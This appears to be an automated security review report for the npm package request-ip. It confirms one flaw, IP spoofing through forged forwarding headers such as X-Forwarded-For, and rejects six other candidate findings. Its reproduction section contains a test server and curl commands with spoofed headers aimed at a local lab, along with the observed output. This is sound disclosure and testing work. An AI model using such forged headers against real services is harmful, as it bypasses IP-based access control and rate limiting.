# request-ip — Security Review Findings

**Package:** [request-ip](https://www.npmjs.com/package/request-ip) | **Files reviewed:** 2

## Summary

| ID | Vulnerability Class | Severity | Breachable | Location |
|----|---------------------|----------|------------|----------|
| RIP-01 | IP Spoofing via Untrusted Headers | MEDIUM | Yes | `getClientIp`, lines 41-85 |

---

## RIP-01: IP Spoofing via Untrusted Headers

- **Vulnerability class:** IP Spoofing / Trust Boundary Violation
- **Raw severity:** MEDIUM
- **Adjusted severity (after reachability):** MEDIUM
- **Location:** `getClientIp`, lines 41-85

### Reachability Analysis

Any remote attacker can forge all non-connection-level IP headers (`x-client-ip`, `x-forwarded-for`, `cf-connecting-ip`, `fastly-client-ip`, `true-client-ip`, `x-real-ip`, `x-cluster-client-ip`, `x-forwarded`, `forwarded-for`, `forwarded`) to spoof their IP address. The library trusts these headers by default without requiring a trusted proxy configuration. This affects any application using `request-ip` for IP-based access control, rate limiting, or logging without an upstream reverse proxy that strips/overwrites these headers.

### Gate Status

**No gate** — exploitable in default configuration with no additional conditions required.

**Breach:** True

---

## Clean / Rejected

| Finding | Reason for Rejection |
|---------|---------------------|
| MEDIUM — ReDoS on IPv6 Regex (variant 1) | IPv6 regex with backreferences has theoretical catastrophic backtracking, but V8's linear-time regex optimization on Node 16+ mitigates this in practice. |
| MEDIUM — ReDoS on IPv6 Regex (variant 2) | Same V8 linear-time mitigation applies to the second regex variant. |
| MEDIUM — Infinite Recursion DoS | Requires a synthetic circular `req` object (e.g., `req.info.remoteAddress` pointing back to `req`). Not reachable with real HTTP request objects. |
| LOW — Property Injection | No exploitable property injection path found during adversarial testing. |
| LOW — Null Guard Logic Bug | Edge case in null handling does not lead to exploitable behavior. |
| LOW — Type Coercion Logic Bug | Type coercion edge case has no security impact in practice. |

---

---

## Reproduction (validated 2026-06-19)

**Lab reference:** `targets/labs/npm-request-ip/`

**Pinned version:** request-ip 3.3.0

### Steps

1. **Install dependencies:**
   ```bash
   npm install request-ip@3.3.0 express
   ```

2. **Start a test server** that uses `request-ip` to determine the client IP and make an authorization decision:
   ```javascript
   const express = require('express');
   const requestIp = require('request-ip');
   const app = express();
   app.use(requestIp.mw());
   app.get('/admin', (req, res) => {
     const ip = req.clientIp;
     const isInternal = ip === '127.0.0.1' || ip === '::1';
     res.json({ client_ip: ip, authorized: isInternal });
   });
   app.listen(5557);
   ```

3. **Send a request with spoofed headers:**
   ```bash
   # Spoof via X-Forwarded-For
   curl -s http://127.0.0.1:5557/admin -H "X-Forwarded-For: 8.8.8.8"
   # -> request-ip reports 8.8.8.8 instead of 127.0.0.1

   # Spoof via multiple headers
   curl -s http://127.0.0.1:5557/admin \
     -H "X-Forwarded-For: 1.2.3.4" \
     -H "X-Real-Ip: 1.1.1.1" \
     -H "CF-Connecting-IP: 9.9.9.9" \
     -H "True-Client-IP: 4.4.4.4"
   ```

4. **Verify** that `request-ip` trusts the forged header over the actual TCP peer.

### Observed output (from `targets/labs/npm-request-ip/results.txt`)

```
request-ip PoC -- version: 3.3.0

  no-spoof headers -> client_ip_reported_by_requestip: '127.0.0.1', message: 'AUTHORIZED as internal IP'

  X-Forwarded-For: 8.8.8.8 -> client_ip_reported_by_requestip: '8.8.8.8', message: 'denied'

  multiple-spoof -> client_ip_reported_by_requestip: '1.2.3.4', message: 'denied'

  >>> RIP-01 CONFIRMED: client IP is taken from untrusted header <<<
      request-ip reported 1.2.3.4 instead of 127.0.0.1
```

### Verdict

**CONFIRMED.** Any unauthenticated client can forge `X-Forwarded-For` (or 9 other headers) to spoof their IP. The library trusts these headers without requiring trusted proxy configuration.

---

**Pipeline:** 7 raw findings → 1 confirmed (1 MEDIUM breachable)
